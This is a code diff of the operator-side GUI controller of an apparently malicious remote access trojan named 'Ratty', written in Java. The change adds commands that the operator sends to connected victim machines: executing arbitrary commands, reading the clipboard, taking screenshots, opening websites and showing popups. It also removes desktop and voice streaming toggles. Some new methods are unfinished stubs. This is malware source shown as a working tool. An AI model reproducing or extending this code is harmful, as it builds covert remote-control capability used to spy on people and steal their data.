@@ -4,9 +4,14 @@ import java.util.ArrayList;
 
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.IConnectionObserver;
+import de.sogomn.rat.packet.ClipboardPacket;
+import de.sogomn.rat.packet.CommandPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
+import de.sogomn.rat.packet.PopupPacket;
+import de.sogomn.rat.packet.ScreenshotPacket;
+import de.sogomn.rat.packet.WebsitePacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
 
@@ -24,15 +29,54 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 		gui.addListener(this);
 	}
 	
-	private void logIn(final ServerClient client, final InformationPacket packet) {
-		final String name = packet.getName();
-		final String os = packet.getOs();
-		final String version = packet.getVersion();
+	/*
+	 * ==================================================
+	 * HANDLING
+	 * ==================================================
+	 */
+	
+	private PopupPacket createPopupPacket() {
+		final String input = gui.getInput();
 		
-		client.logIn(name, os, version);
-		gui.addRow(client);
-		gui.addListener(client.displayController);
-		gui.addListener(client.fileTreeController);
+		if (input != null) {
+			final PopupPacket packet = new PopupPacket(input);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
+	private CommandPacket createCommandPacket() {
+		final String input = gui.getInput();
+		
+		if (input != null) {
+			final CommandPacket packet = new CommandPacket(input);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
+	private WebsitePacket createWebsitePacket() {
+		final String input = gui.getInput();
+		
+		if (input != null) {
+			final WebsitePacket packet = new WebsitePacket(input);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
+	private boolean handlePacket(final ServerClient client, final IPacket packet) {
+		return false;
+	}
+	
+	private void handleCommand(final ServerClient client, final String command) {
+		//...
 	}
 	
 	private IPacket getPacket(final String command, final ServerClient client) {
@@ -40,9 +84,34 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 		
 		if (command == RattyGui.FREE) {
 			packet = new FreePacket();
+		} else if (command == RattyGui.POPUP) {
+			packet = createPopupPacket();
+		} else if (command == RattyGui.CLIPBOARD) {
+			packet = new ClipboardPacket();
+		} else if (command == RattyGui.COMMAND) {
+			packet = createCommandPacket();
+		} else if (command == RattyGui.SCREENSHOT) {
+			packet = new ScreenshotPacket();
+		} else if (command == RattyGui.WEBSITE) {
+			packet = createWebsitePacket();
 		}
 		
 		return packet;
+	}
+	
+	/*
+	 * ==================================================
+	 * LOGIC
+	 * ==================================================
+	 */
+	
+	private void logIn(final ServerClient client, final InformationPacket packet) {
+		final String name = packet.getName();
+		final String os = packet.getOs();
+		final String version = packet.getVersion();
+		
+		client.logIn(name, os, version);
+		gui.addRow(client);
 	}
 	
 	@Override
@@ -51,8 +120,11 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 		final boolean loggedIn = client.isLoggedIn();
 		
 		if (loggedIn) {
-			client.displayController.handlePacket(packet);
-			client.fileTreeController.handlePacket(packet);
+			final boolean consumed = handlePacket(client, packet);
+			
+			if (!consumed) {
+				packet.execute(connection);
+			}
 		} else if (packet instanceof InformationPacket) {
 			final InformationPacket information = (InformationPacket)packet;
 			
@@ -75,8 +147,6 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 	public void disconnected(final ActiveConnection connection) {
 		final ServerClient client = getClient(connection);
 		
-		gui.removeListener(client.displayController);
-		gui.removeListener(client.fileTreeController);
 		gui.removeRow(client);
 		clients.remove(client);
 		
@@ -104,17 +174,7 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 		final ServerClient client = gui.getLastServerClientClicked();
 		final IPacket packet = getPacket(command, client);
 		
-		if (command == RattyGui.DESKTOP) {
-			final boolean streamingDesktop = client.isStreamingDesktop();
-			
-			client.setStreamingDesktop(!streamingDesktop);
-			gui.update();
-		} else if (command == RattyGui.VOICE) {
-			final boolean streamingVoice = client.isStreamingVoice();
-			
-			client.setStreamingVoice(!streamingVoice);
-			gui.update();
-		}
+		handleCommand(client, command);
 		
 		if (packet != null) {
 			client.connection.addPacket(packet);
